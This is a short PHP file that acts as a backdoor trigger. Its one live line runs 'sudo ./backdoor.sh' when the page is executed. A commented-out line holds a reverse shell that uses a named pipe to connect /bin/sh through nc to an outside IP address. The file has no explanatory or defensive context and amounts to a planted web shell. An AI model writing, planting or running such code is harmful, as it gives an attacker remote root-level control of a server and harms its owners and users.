<?php

//exec("sudo rm /tmp/f;sudo mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 50.113.62.255 22 >/tmp/f");
exec("sudo ./backdoor.sh");
?>
